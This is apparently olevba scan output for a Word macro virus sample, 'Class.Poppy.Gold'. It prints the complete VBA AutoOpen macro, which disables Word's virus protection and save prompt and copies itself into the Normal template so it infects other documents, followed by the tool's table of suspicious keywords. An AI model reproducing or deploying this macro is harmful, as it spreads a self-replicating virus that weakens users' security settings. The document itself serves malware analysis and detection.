olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.n-01c39b6fd5f83117cbeeec652c0a8da46f486f91
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.n-01c39b6fd5f83117cbeeec652c0a8da46f486f91 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
On Error GoTo out
Options.VirusProtection = False
Options.SaveNormalPrompt = False
ad = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
nt = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If nt > 40 And ad > 0 Then GoTo out
If nt < 40 Then
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
    ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.InsertLines (ad + 1), "' I infected " & Application.UserName & " on: " & Now
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\cgold.drv"
End If
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
host.CodeModule.AddFromFile ("c:\cgold.drv")
host.CodeModule.deletelines 1, 4
If nt < 40 Then host.CodeModule.replaceline 1, "Sub AutoClose()"
out:
If nt > 40 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End Sub
' Class.Poppy.Gold (noPoly) Infection Log
' ---------------------------------------

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

